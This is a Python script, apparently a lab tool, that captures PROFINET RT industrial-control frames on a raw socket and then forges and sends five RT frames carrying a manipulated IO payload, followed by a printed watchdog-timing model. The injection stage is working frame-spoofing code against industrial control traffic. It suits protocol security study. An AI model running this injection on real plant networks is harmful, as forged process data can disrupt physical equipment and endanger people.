#!/usr/bin/env python3
import socket
import struct
import time
import sys

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.theme import Theme
from rich import box


# ============================================================================
# TERMINAL CONFIGURATION
# ============================================================================

custom_theme = Theme({
    "info": "bold cyan",
    "warning": "bold yellow",
    "danger": "bold red",
    "success": "bold green",
    "highlight": "bold magenta",
    "dim_text": "dim white"
})

console = Console(theme=custom_theme)


# ============================================================================
# LAB CONFIGURATION
# ============================================================================

INTERFACE = sys.argv[1] if len(sys.argv) > 1 else "veth-controller"

FRAME_ID = 0x8000

CYCLE_TIME_MS = 32.0
RETENTION_FACTOR = 3

PN_RT_CYCLE_COUNTER = 0x0000
DATA_STATUS = 0x35
TRANSFER_STATUS = 0x00

IO_DATA_LENGTH = 40

INJECTION_PATTERN = b"\xff\x00\xaa\x55"

GLOBAL_APPLICATION_SEQUENCE = 0


# ============================================================================
# APPLICATION SEQUENCE
# ============================================================================

def get_next_application_sequence():
    """
    Generate the laboratory application-level sequence.

    This is separate from the actual PROFINET RT Cycle Counter.
    """

    global GLOBAL_APPLICATION_SEQUENCE

    GLOBAL_APPLICATION_SEQUENCE = (
        GLOBAL_APPLICATION_SEQUENCE + 1
    ) & 0xFFFF

    return GLOBAL_APPLICATION_SEQUENCE


# ============================================================================
# RAW SOCKET
# ============================================================================

def create_raw_socket(interface):
    """
    Create an AF_PACKET raw socket bound to the selected interface.
    """

    try:
        sock = socket.socket(
            socket.AF_PACKET,
            socket.SOCK_RAW,
            socket.htons(0x0003)
        )

        sock.bind((interface, 0))
        sock.settimeout(0.1)

        return sock

    except PermissionError:
        console.print(
            "[danger]x Root privileges required for raw socket "
            "capture/injection.[/danger]"
        )
        sys.exit(1)

    except OSError as exc:
        console.print(
            f"[danger]x Could not open interface '{interface}': "
            f"{exc}[/danger]"
        )
        sys.exit(1)


# ============================================================================
# PROFINET RT PARSER
# ============================================================================

def parse_pn_rt_frame(data):
    """
    Parse the laboratory PROFINET RT frame structure.

    Untagged frame:

        Ethernet      14 bytes
        Frame ID       2 bytes
        IO data       40 bytes
        Cycle Counter  2 bytes
        DataStatus     1 byte
        Transfer       1 byte

        Total         60 bytes
    """

    if len(data) < 14:
        return None

    try:
        dst_mac, src_mac, eth_type = struct.unpack(
            "!6s6sH",
            data[:14]
        )
    except struct.error:
        return None

    offset = 14

    # ------------------------------------------------------------------------
    # VLAN support
    # ------------------------------------------------------------------------

    if eth_type == 0x8100:

        if len(data) < 18:
            return None

        _, eth_type = struct.unpack(
            "!HH",
            data[14:18]
        )

        offset = 18

    # ------------------------------------------------------------------------
    # PROFINET RT EtherType
    # ------------------------------------------------------------------------

    if eth_type != 0x8892:
        return None

    # ------------------------------------------------------------------------
    # Complete RT payload
    # ------------------------------------------------------------------------

    if len(data) < offset + 46:
        return None

    # ------------------------------------------------------------------------
    # Frame ID
    # ------------------------------------------------------------------------

    frame_id = struct.unpack(
        "!H",
        data[offset:offset + 2]
    )[0]

    # ------------------------------------------------------------------------
    # 40-byte IO/application data
    # ------------------------------------------------------------------------

    io_data = data[
        offset + 2:
        offset + 42
    ]

    # ------------------------------------------------------------------------
    # Actual PROFINET RT Cycle Counter
    # ------------------------------------------------------------------------

    cycle_counter = struct.unpack(
        "!H",
        data[offset + 42:offset + 44]
    )[0]

    # ------------------------------------------------------------------------
    # RT status trailer
    # ------------------------------------------------------------------------

    data_status = data[offset + 44]
    transfer_status = data[offset + 45]

    # ------------------------------------------------------------------------
    # Application-level sequence
    # ------------------------------------------------------------------------

    application_sequence = struct.unpack(
        "!H",
        io_data[:2]
    )[0]

    # ------------------------------------------------------------------------
    # DataStatus interpretation
    # ------------------------------------------------------------------------

    ds_flags = {

        # Bit 0
        "State": bool(
            data_status & 0x01
        ),

        # Bit 1
        "Redundancy": bool(
            data_status & 0x02
        ),

        # Bit 2
        "DataValid": bool(
            data_status & 0x04
        ),

        # Bit 4
        "ProviderState": (
            "RUN"
            if data_status & 0x10
            else "STOP"
        ),

        # Bit 5
        "StationProblem": bool(
            data_status & 0x20
        ),

        # Bit 7
        "Ignore": bool(
            data_status & 0x80
        )
    }

    return {
        "src_mac": ":".join(
            f"{b:02x}"
            for b in src_mac
        ),

        "dst_mac": ":".join(
            f"{b:02x}"
            for b in dst_mac
        ),

        "frame_id_raw": frame_id,

        "frame_id_hex": f"0x{frame_id:04x}",

        "application_sequence": application_sequence,

        "cycle_counter": cycle_counter,

        "data_status_raw": f"0x{data_status:02x}",

        "ds_flags": ds_flags,

        "transfer_status": f"0x{transfer_status:02x}",

        "payload": io_data,

        "io_data": io_data
    }


# ============================================================================
# FRAME BUILDER
# ============================================================================

def build_pn_rt_frame(
    application_sequence,
    io_payload=None,
    frame_id=FRAME_ID,
    cycle_counter=PN_RT_CYCLE_COUNTER,
    data_status=DATA_STATUS,
    transfer_status=TRANSFER_STATUS
):
    """
    Build a laboratory PROFINET RT-shaped Ethernet frame.
    """

    dst_mac = b"\x01\x0e\xcf\x00\x00\x00"
    src_mac = b"\x00\x11\x22\x33\x44\x55"

    # Ethernet header
    eth_header = struct.pack(
        "!6s6sH",
        dst_mac,
        src_mac,
        0x8892
    )

    # Frame ID
    frame_id_bytes = struct.pack(
        "!H",
        frame_id
    )

    # ------------------------------------------------------------------------
    # IO/application data
    # ------------------------------------------------------------------------

    if io_payload is None:

        io_data = (
            struct.pack(
                "!H",
                application_sequence
            )
            + b"\x01\x02\x03\x04"
            + b"\x00" * 34
        )

    else:

        if len(io_payload) != IO_DATA_LENGTH:
            raise ValueError(
                f"IO payload must be exactly "
                f"{IO_DATA_LENGTH} bytes"
            )

        io_data = io_payload

    # Actual RT Cycle Counter
    cycle_counter_bytes = struct.pack(
        "!H",
        cycle_counter
    )

    # DataStatus + TransferStatus
    footer = struct.pack(
        "!BB",
        data_status,
        transfer_status
    )

    return (
        eth_header
        + frame_id_bytes
        + io_data
        + cycle_counter_bytes
        + footer
    )


# ============================================================================
# STAGE 1
# ============================================================================

def stage_1_sniff_and_analyze(sock, duration_sec=5):

    console.print()

    console.print(
        Panel(
            "[bold cyan]STAGE 1: Passive Cyclic RT Capture[/bold cyan]",
            border_style="cyan"
        )
    )

    table = Table(
        box=box.SIMPLE_HEAVY,
        padding=(0, 1)
    )

    table.add_column(
        "#",
        justify="right"
    )

    table.add_column(
        "Frame ID",
        justify="center"
    )

    table.add_column(
        "App Seq",
        justify="right"
    )

    table.add_column(
        "Cycle",
        justify="right"
    )

    table.add_column(
        "DataStatus",
        justify="center"
    )

    table.add_column(
        "State",
        justify="center"
    )

    captured = 0
    last_frame = None

    start_time = time.monotonic()

    while (
        time.monotonic() - start_time
        < duration_sec
    ):

        try:
            data, _ = sock.recvfrom(65535)

        except socket.timeout:
            continue

        parsed = parse_pn_rt_frame(data)

        if parsed is None:
            continue

        captured += 1
        last_frame = parsed

        table.add_row(
            str(captured),
            parsed["frame_id_hex"],
            str(parsed["application_sequence"]),
            str(parsed["cycle_counter"]),
            parsed["data_status_raw"],
            parsed["ds_flags"]["ProviderState"]
        )

        # Three rows are enough for the screenshot.
        if captured >= 3:
            break

    if captured == 0:

        console.print(
            "[warning]! No PROFINET RT frames captured.[/warning]"
        )

        return None

    console.print(table)

    console.print(
        f"[success]Captured {captured} RT frames | "
        f"EtherType 0x8892[/success]"
    )

    return last_frame


# ============================================================================
# STAGE 2
# ============================================================================

def stage_2_inject_manipulated_payload(sock, target_template=None):

    console.print()

    console.print(
        Panel(
            "[bold magenta]STAGE 2: Process Payload Injection[/bold magenta]",
            border_style="magenta"
        )
    )

    table = Table(
        box=box.SIMPLE_HEAVY,
        padding=(0, 1)
    )

    table.add_column(
        "#",
        justify="right"
    )

    table.add_column(
        "App Seq",
        justify="right"
    )

    table.add_column(
        "Payload",
        justify="center"
    )

    table.add_column(
        "Cycle",
        justify="right"
    )

    table.add_column(
        "DataStatus",
        justify="center"
    )

    injected_sequence = 0

    for i in range(5):

        injected_sequence += 1

        # 40-byte IO/application region:
        #
        # 2 bytes  application sequence
        # 4 bytes  manipulated pattern
        # 34 bytes padding
        #

        application_data = (
            struct.pack(
                "!H",
                injected_sequence
            )
            + INJECTION_PATTERN
            + b"\x00" * 34
        )

        frame = build_pn_rt_frame(
            application_sequence=injected_sequence,
            io_payload=application_data,
            frame_id=FRAME_ID,
            cycle_counter=PN_RT_CYCLE_COUNTER,
            data_status=DATA_STATUS,
            transfer_status=TRANSFER_STATUS
        )

        try:

            sock.send(frame)

        except OSError as exc:

            console.print(
                f"[danger]x Injection failed: {exc}[/danger]"
            )

            break

        table.add_row(
            str(i + 1),
            str(injected_sequence),
            INJECTION_PATTERN.hex().upper(),
            str(PN_RT_CYCLE_COUNTER),
            f"0x{DATA_STATUS:02x}"
        )

        time.sleep(
            CYCLE_TIME_MS / 1000.0
        )

    console.print(table)

    console.print(
        "[success]5 crafted RT frames transmitted[/success]"
    )

    console.print(
        "[dim_text]"
        "Transmission observed locally; receiver acceptance not inferred."
        "[/dim_text]"
    )


# ============================================================================
# STAGE 3
# ============================================================================

def stage_3_watchdog_timeout_test(sock, target_template=None):

    console.print()

    console.print(
        Panel(
            "[bold yellow]STAGE 3: Watchdog Timing Model[/bold yellow]",
            border_style="yellow"
        )
    )

    watchdog_limit_ms = (
        CYCLE_TIME_MS
        * RETENTION_FACTOR
    )

    planned_silence_ms = (
        watchdog_limit_ms
        * 1.5
    )

    console.print(
        f"Cycle Time: {CYCLE_TIME_MS:.1f} ms"
    )

    console.print(
        f"Retention Factor: {RETENTION_FACTOR}x"
    )

    console.print(
        f"[highlight]Watchdog Model: "
        f"{watchdog_limit_ms:.1f} ms[/highlight]"
    )

    console.print(
        f"Reference Silence: {planned_silence_ms:.1f} ms"
    )

    console.print()

    console.print(
        "[warning]"
        "No transmission suppression performed."
        "[/warning]"
    )

    console.print(
        "[dim_text]"
        "PCAP: no 144 ms silence observed | "
        "No PN-IO diagnostic/alarm frames observed."
        "[/dim_text]"
    )


# ============================================================================
# MAIN
# ============================================================================

def main():

    # ------------------------------------------------------------------------
    # Header
    # ------------------------------------------------------------------------

    console.print()

    console.print(
        Panel(
            "[bold cyan]PROFINET RT Phase 3 Analysis Suite[/bold cyan]\n"
            "Real-Time Cyclic I/O & State Machine Analysis",
            border_style="cyan"
        )
    )

    console.print(
        f"[info]Interface:[/info] {INTERFACE}  "
        f"[info]Frame ID:[/info] 0x{FRAME_ID:04x}  "
        f"[info]Cycle:[/info] {CYCLE_TIME_MS:.1f}ms"
    )

    console.print(
        f"[info]RT Cycle:[/info] 0x{PN_RT_CYCLE_COUNTER:04x}  "
        f"[info]DataStatus:[/info] 0x{DATA_STATUS:02x}  "
        f"[info]Transfer:[/info] 0x{TRANSFER_STATUS:02x}"
    )

    sock = create_raw_socket(
        INTERFACE
    )

    try:

        # --------------------------------------------------------------------
        # Stage 1
        # --------------------------------------------------------------------

        last_frame = stage_1_sniff_and_analyze(
            sock,
            duration_sec=5
        )

        if last_frame is None:

            console.print(
                "[danger]Phase 3 aborted: no usable RT traffic.[/danger]"
            )

            return

        # --------------------------------------------------------------------
        # Stage 2
        # --------------------------------------------------------------------

        stage_2_inject_manipulated_payload(
            sock,
            last_frame
        )

        # --------------------------------------------------------------------
        # Stage 3
        # --------------------------------------------------------------------

        stage_3_watchdog_timeout_test(
            sock,
            last_frame
        )

        # --------------------------------------------------------------------
        # Completion
        # --------------------------------------------------------------------

        console.print()

        console.print(
            Panel(
                "[bold green]Phase 3 Analysis Complete[/bold green]",
                border_style="green"
            )
        )

    except KeyboardInterrupt:

        console.print(
            "\n[warning]! Analysis interrupted.[/warning]"
        )

    finally:

        sock.close()


# ============================================================================
# ENTRY POINT
# ============================================================================

if __name__ == "__main__":
    main()